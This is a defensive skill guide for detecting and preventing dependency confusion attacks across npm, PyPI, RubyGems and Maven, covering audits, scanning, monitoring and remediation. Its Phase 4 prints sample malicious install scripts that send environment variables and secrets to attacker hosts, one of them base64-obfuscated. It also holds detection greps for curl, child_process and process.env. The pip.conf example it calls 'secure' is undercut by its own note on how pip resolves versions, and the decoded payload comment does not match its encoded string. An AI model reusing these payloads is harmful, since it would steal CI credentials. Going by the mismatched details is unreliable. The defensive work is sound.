---
name: detecting-dependency-confusion-attacks
description: >-
  Detects and prevents dependency confusion (namespace confusion) attacks where
  attackers publish malicious packages to public registries (npm, PyPI, RubyGems,
  Maven Central) using names that match internal private packages. When misconfigured
  package managers prioritize public over private registries, malicious packages get
  installed. Use when configuring CI/CD pipelines, auditing package manager configurations,
  investigating supply chain compromises, implementing scoped package strategies, or
  responding to suspicious install scripts. Covers 2026 attack campaigns including
  Mini Shai-Hulud (170+ npm packages), TanStack compromise, and Microsoft-documented
  reconnaissance payloads. Mapped to MITRE ATT&CK T1195.002 (Compromise Software
  Dependencies) and NIST CSF supply chain security controls. Do not use for enumerating
  claimable internal package names with confused or dep-scan — use detecting-dependency-confusion.
domain: cybersecurity
subdomain: supply-chain-security
tags:
- dependency-confusion
- supply-chain
- npm
- pypi
- rubygems
- package-manager
- typosquatting
- malicious-packages
- software-composition-analysis
- sbom
version: "1.0"
author: dakshverma23
license: Apache-2.0
nist_csf:
- SR.1-01
- SR.1-02
- SR.2-01
- ID.SC-01
- ID.SC-02
mitre_attack:
- T1195.002
- T1195.001
---

# Detecting Dependency Confusion Attacks

## When to Use

- When configuring **CI/CD pipelines** that install dependencies from both private and public registries
- When **auditing existing package manager configurations** (.npmrc, .pypirc, pip.conf, Gemfile) for registry prioritization
- After **suspicious package installation** alerts from EDR, SIEM, or Socket.dev/Snyk showing unexpected network connections during `npm install` or `pip install`
- When **implementing scoped package strategies** for organizations with internal package registries (Artifactory, Nexus, GitHub Packages)
- During **M&A due diligence** assessing target company's supply chain security posture
- When investigating **build failures** caused by malicious install scripts (postinstall hooks, setup.py) that exfiltrate environment variables
- After **security researcher disclosure** of public packages mimicking your organization's internal namespace

**Do not use** for:
- CVE-based vulnerability scanning (use Snyk, Dependabot) — this skill focuses on namespace confusion and malicious package detection, not outdated dependencies
- Basic package manager configuration and registry setup — use **detecting-dependency-confusion** for fundamental registry prioritization and namespace claiming
- This skill is for **advanced behavioral detection** (install script analysis, runtime monitoring, SIEM integration); use **detecting-dependency-confusion** for foundational configuration and confused/dep-scan scanning

## Prerequisites

- Access to **package manager configuration files** (.npmrc, .pypirc, pip.conf, Gemfile, pom.xml, build.gradle)
- List of **internal/private package names** used by your organization
- Access to **private package registry** (Artifactory, Nexus, npm Enterprise, Azure Artifacts, AWS CodeArtifact)
- **CI/CD pipeline logs** showing package installation steps
- **SBOM (Software Bill of Materials)** if available (CycloneDX, SPDX format)
- **Network monitoring logs** (optional) showing outbound connections during builds
- Knowledge of **scoped package naming** conventions (@orgname/package for npm)
- Socket.dev, Snyk, or equivalent **SCA tool** for behavioral analysis (optional but recommended)

## Workflow

### Phase 1: Identify Private Package Inventory

Extract and inventory internal packages, then check for public collisions:

```bash
# Extract internal packages
find . -name package-lock.json -exec jq -r '.packages | keys[]' {} \; | sort -u > internal_packages.txt
find . -name requirements.txt -exec cat {} \; | grep -v "^#" | cut -d'=' -f1 | sort -u >> internal_packages.txt

# Check public registries for collisions
cat internal_packages.txt | while read pkg; do
  npm view "$pkg" version 2>/dev/null && echo "⚠️  npm: $pkg"
  pip index versions "$pkg" 2>/dev/null && echo "⚠️  PyPI: $pkg"
done
```

**Red flags**: Generic names (utils, config, common, core), organization-specific names, packages published after your internal version date.

### Phase 2: Audit Package Manager Configurations

Verify registry resolution order. **Insecure patterns** allow public registry precedence over private:

**npm** (.npmrc) — secure configuration:
```ini
@yourorg:registry=https://npm.yourorg.com/
@yourorg:always-auth=true
//npm.yourorg.com/:_authToken=${NPM_TOKEN}
```

**PyPI** (pip.conf) — secure configuration:
```ini
[global]
index-url = https://pypi.yourorg.com/simple  # Private FIRST
extra-index-url = https://pypi.org/simple    # Public fallback
```

**Critical**: pip installs the **first package found** with highest version across all indexes.

**Maven** (pom.xml) — private repository first:
```xml
<repositories>
  <repository>
    <id>company-private</id>
    <url>https://maven.yourorg.com/repository</url>
  </repository>
</repositories>
```

**RubyGems** (Gemfile) — explicit sourcing:
```ruby
source 'https://gems.yourorg.com' do
  gem 'internal-package'
end
source 'https://rubygems.org' do
  gem 'rails'
end
```

### Phase 3: Detect Malicious Packages in Public Registries

Monitor public registries for squatted internal package names:

```bash
# Automated monitoring
while IFS= read -r package; do
  NPM_INFO=$(npm view "$package" --json 2>/dev/null)
  if [ $? -eq 0 ]; then
    HAS_SCRIPTS=$(echo "$NPM_INFO" | jq -r '.scripts | has("postinstall", "preinstall")')
    [ "$HAS_SCRIPTS" = "true" ] && echo "🚨 $package has install scripts"
  fi
done < internal_packages.txt

# Manual inspection
npm pack suspicious-package@1.2.3
tar -xzf suspicious-package-1.2.3.tgz
cat package/package.json | jq '.scripts'
grep -r "curl\|wget\|process.env\|eval\|child_process" package/
```

### Phase 4: Analyze Install Script Behavior

Inspect package install hooks for exfiltration payloads:

**Known malicious patterns (2026 campaigns)**:

**Mini Shai-Hulud campaign** (May 2026):
```javascript
// postinstall script in malicious @tanstack packages
const https = require('https');
const os = require('os');

const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env,
  cwd: process.cwd()
});

https.request('https://attacker-c2.com/collect', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'}
}, () => {}).write(data);
```

**Microsoft-documented reconnaissance payload** (May 2026):
```javascript
// Obfuscated postinstall extracting CI secrets
const {exec} = require('child_process');
const b64 = "Y3VybCAtWCBQT1NUIC1kICQoZW52IHwgYmFzZTY0KQ==";
exec(Buffer.from(b64, 'base64').toString());
// Decoded: curl -X POST -d $(env | base64) https://oob.moika.tech
```

**Detection approach**:
```bash
# Extract and analyze all install scripts from package.json files
find node_modules/ -name package.json -exec jq -r '.scripts | select(.postinstall or .preinstall or .install)' {} \; > install_scripts.json

# Static analysis for suspicious APIs
grep -r "require.*child_process" node_modules/
grep -r "require.*https" node_modules/
grep -r "process\.env" node_modules/ | grep -v "NODE_ENV"

# Dynamic analysis with sandbox
# Use npm-sandbox or run in isolated Docker container with egress monitoring
docker run -it --network=monitor node:20-alpine sh
npm install suspicious-package --ignore-scripts=false
# Monitor network connections in separate terminal
```

### Phase 5: Implement Registry Prioritization Controls

**npm: Lock down scoped packages**:
```bash
# Migrate to scoped names: @yourorg/internal-utils
cat > .npmrc << 'EOF'
@yourorg:registry=https://npm.yourorg.com/
//npm.yourorg.com/:_authToken=${NPM_TOKEN}
always-auth=true
EOF
```

**PyPI: Explicit ordering**:
```bash
pip install --index-url https://pypi.yourorg.com/simple \
            --extra-index-url https://pypi.org/simple \
            -r requirements.txt
```

**Maven: Mirror configuration**:
```xml
<mirror>
  <id>company-mirror</id>
  <url>https://maven.yourorg.com/repository</url>
  <mirrorOf>*</mirrorOf>
</mirror>
```

### Phase 6: Deploy Behavioral Monitoring

Implement runtime detection for malicious package behavior:

**Socket.dev integration** (recommended):
```bash
# Install Socket CLI
npm install -g @socketsecurity/cli

# Authenticate
socket login

# Scan dependencies before install
socket npm audit

# Block installation if threats detected
socket npm install --bail-on-threat

# Socket detects:
# - Network connections during install
# - Filesystem writes outside node_modules/
# - Shell command execution
# - Obfuscated code
# - Environment variable access
```

**Snyk integration**:
```bash
# Install Snyk CLI
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities AND malicious packages
snyk test

# Monitor project continuously
snyk monitor

# Snyk catches:
# - Known malicious packages (crowdsourced IOCs)
# - Typosquatting attempts
# - Suspicious version patterns
```

**Manual network monitoring** (if commercial tools unavailable):
```bash
# Run npm install in network-monitored environment
# Option 1: Use Wireshark/tcpdump
tcpdump -i any -n 'tcp port 80 or tcp port 443' -w npm_install.pcap &
npm install
# Analyze pcap for unexpected destinations

# Option 2: Use HTTP proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
npm install
# Check proxy logs for suspicious POST requests with env data
```

### Phase 7: Establish Continuous Monitoring

**CI/CD integration**:
```yaml
# GitHub Actions
name: Dependency Confusion Check
on: [pull_request]
jobs:
  check-deps:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Socket Security Scan
        uses: SocketDev/socket-action@v1
        with:
          token: ${{ secrets.SOCKET_TOKEN }}
          fail-on-threat: true
```

**SIEM alerting**:
```yaml
# Detection rule for install script exfiltration
rule: Suspicious npm Install Network Activity
conditions:
  - process_name: npm|node
  - process_cmdline contains: install
  - network_connection.dest_ip NOT IN [registry.npmjs.org, pypi.org]
  - network_bytes_sent > 10000
severity: HIGH
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Dependency Confusion** | Attack exploiting package manager registry resolution where public packages with same name as private packages get installed due to misconfiguration or version precedence |
| **Namespace Confusion** | Alternative term for dependency confusion emphasizing exploitation of namespace collisions between private and public registries |
| **Scoped Packages** | npm naming convention (@orgname/package) that reserves namespace for specific npm user/organization, preventing public squatting |
| **Registry Prioritization** | Order in which package managers query multiple registries; misconfigured priority allows public malicious packages to supersede private legitimate ones |
| **Install Scripts** | Package manager hooks (postinstall, preinstall) that execute arbitrary code during dependency installation; common attack vector for exfiltration |
| **Typosquatting** | Publishing packages with names similar to popular packages (e.g., "reqeusts" instead of "requests") to trick developers into installing malicious code |
| **SBOM (Software Bill of Materials)** | Machine-readable inventory of software components and dependencies (CycloneDX, SPDX formats) enabling supply chain transparency |
| **Zero-Day Supply Chain Attack** | Malicious package published to registry before security vendors catalog it; behavioral analysis (Socket.dev) required for detection |
| **Package Provenance** | Cryptographic attestation linking published package to specific source code commit and build environment (SLSA, Sigstore) |

## Tools & Systems

- **Socket.dev**: Behavioral analysis SCA tool detecting malicious packages via install script monitoring, network calls, and filesystem writes; $1B valuation (May 2026)
- **Snyk Open Source**: CVE and malicious package scanner with proprietary vulnerability database and reachability analysis for Java/JavaScript/Python
- **Artifactory / Nexus**: Private package registry servers supporting npm, PyPI, Maven, NuGet with caching, access control, and audit logging
- **npm Enterprise / GitHub Packages**: Hosted private npm registries with scoped package namespace enforcement and SSO integration
- **Syft + Grype**: Open-source SBOM generator (Syft) and vulnerability scanner (Grype) by Anchore supporting container and filesystem scanning
- **Dependency-Track**: OWASP project for continuous SBOM analysis and vulnerability intelligence aggregation across multiple sources
- **OSV-Scanner**: Google's free CLI backed by OSV.dev database covering 13+ ecosystems including npm, PyPI, Maven, Go

## Common Scenarios

### Scenario: CI Pipeline Installing Malicious Package

**Context**: After Artifactory migration, `company-utils` from public npm (not private) exfiltrated CI credentials via postinstall script to `oob.moika.tech`.

**Response**:
1. Revoke AWS credentials, rotate CI secrets, audit CloudTrail
2. Fix `.npmrc`: add `@company:registry=https://artifactory.internal/`
3. Rename packages to scoped format (`@company/utils`)
4. Deploy Socket.dev, add CI checks
5. Schedule daily public registry monitoring

### Scenario: Typosquatted Package

**Context**: SBOM audit found `company-utilz` (typo) in 12 services; malicious version on public npm downloading EC2 metadata.

**Response**:
1. Identify affected services, assess EC2 metadata access
2. Replace with `@company/utils`, force reinstall
3. Extract IOCs from malicious package
4. Implement pre-commit hooks, Socket.dev PR checks
5. Create typosquatting watchlist

## Output Format

```
DEPENDENCY CONFUSION DETECTION REPORT
======================================
Audit Date: 2026-07-15 | Scope: 47 repositories (npm, PyPI, Maven)

PRIVATE PACKAGE INVENTORY
- npm scoped (@yourcorp/*): 45 ✅
- npm unscoped: 12 ⚠️ HIGH RISK
- PyPI: 28 | Maven: 4

PUBLIC COLLISIONS DETECTED
━━━━━━━━━━━━━━━━━━━━━━━━
1. 🚨 CRITICAL: company-auth (npm 1.2.3, published 2026-07-10)
   - Install Scripts: YES (postinstall → network call to 185.220.101.42)
   - Action: Migrate to @yourcorp/auth IMMEDIATELY

2. ⚠️ HIGH: internal-utils (PyPI 0.9.1, published 2026-06-20)
   - Setup.py: Contains os.environ access
   - Action: Verify researcher legitimacy, migrate to scoped

CONFIGURATION AUDIT
- backend-api (.npmrc): ❌ INSECURE - No scoped registry
- ml-pipeline (pip.conf): ❌ INSECURE - Public PyPI first
- frontend-web (.npmrc): ✅ SECURE - Scoped to private

MALICIOUS PACKAGE ANALYSIS
company-auth@1.2.3 → Exfiltrates env vars to 185.220.101.42

REMEDIATION ROADMAP
Priority 1 (0-48h): Rotate credentials, remove collisions, deploy scoping
Priority 2 (1-2 weeks): Deploy Socket.dev, add pre-commit hooks, SIEM alerts
Priority 3 (1 month): SBOM audit, SLSA Build Level 2, quarterly audits
```

## Verification Checklist

- [ ] All internal packages migrated to scoped names (@orgname/package)
- [ ] .npmrc contains scoped registry configuration with authentication
- [ ] pip.conf prioritizes private index-url before extra-index-url
- [ ] Maven settings.xml uses mirror or explicit repository order
- [ ] CI/CD pipelines inject package registry credentials securely (not hardcoded)
- [ ] Socket.dev or equivalent SCA tool deployed with --bail-on-threat
- [ ] Pre-commit hooks block unscoped internal package references
- [ ] Daily automated check for public packages matching internal namespace
- [ ] SIEM alerting configured for npm/pip network anomalies during install
- [ ] Incident response playbook includes dependency confusion scenario
- [ ] SBOM generated and monitored (CycloneDX/SPDX)
- [ ] Security training delivered to engineering on supply chain attacks
- [ ] Quarterly supply chain security audit scheduled

